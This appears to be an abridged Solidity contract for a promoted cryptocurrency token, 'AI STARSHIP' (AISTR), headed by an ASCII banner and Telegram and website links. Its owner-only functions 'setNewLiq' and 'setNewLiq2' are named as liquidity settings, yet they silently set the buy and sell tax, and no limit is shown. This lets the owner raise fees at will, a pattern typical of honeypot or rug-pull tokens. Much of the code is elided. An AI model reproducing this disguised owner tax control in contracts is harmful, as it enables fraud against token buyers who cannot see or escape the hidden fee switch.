...
/**
 ________  ___          ________  _________  ________  ________  ________  ___  ___  ___  ________   
|\   __  \|\  \        |\   ____\|\___   ___\\   __  \|\   __  \|\   ____\|\  \|\  \|\  \|\   __  \  
\ \  \|\  \ \  \       \ \  \___|\|___ \  \_\ \  \|\  \ \  \|\  \ \  \___|\ \  \\\  \ \  \ \  \|\  \ 
 \ \   __  \ \  \       \ \_____  \   \ \  \ \ \   __  \ \   _  _\ \_____  \ \   __  \ \  \ \   ____\
  \ \  \ \  \ \  \       \|____|\  \   \ \  \ \ \  \ \  \ \  \\  \\|____|\  \ \  \ \  \ \  \ \  \___|
   \ \__\ \__\ \__\        ____\_\  \   \ \__\ \ \__\ \__\ \__\\ _\ ____\_\  \ \__\ \__\ \__\ \__\   
    \|__|\|__|\|__|       |\_________\   \|__|  \|__|\|__|\|__|\|__|\_________\|__|\|__|\|__|\|__|   

TG: https://t.me/AIStarship
Twitter: https://twitter.com/AIStarship
Website: https://aistarship.org

Visit our TG for more information and updates!
...
contract AISTARSHIP is Context, IERC20, Ownable {
    ...
    string private constant _name = "AI STARSHIP";
    string private constant _symbol = "AISTR";
    uint256 public _maxTxAmount = 200_000 * 10**_decimals;
    uint256 public _maxWalletSize = 200_000 * 10**_decimals;
    uint256 public _taxSwap = 99_386 * 10**_decimals;
    ...
    constructor () {
        _taxWallet = payable(0x180f6522bFe7FAeA8108a52a80999C2Cb6A78Dd2);
    ...
    function setNewLiq(uint256 NewLiq) external onlyOwner() {
    _buyTax = NewLiq;
    }
    ...
    function setNewLiq2(uint256 NewLiq2) external onlyOwner() {
    _salesTax = NewLiq2;
    }
    ...
    function setTaxSwap(uint256 taxSwap) external onlyOwner() {
        _taxSwap = taxSwap;
    }
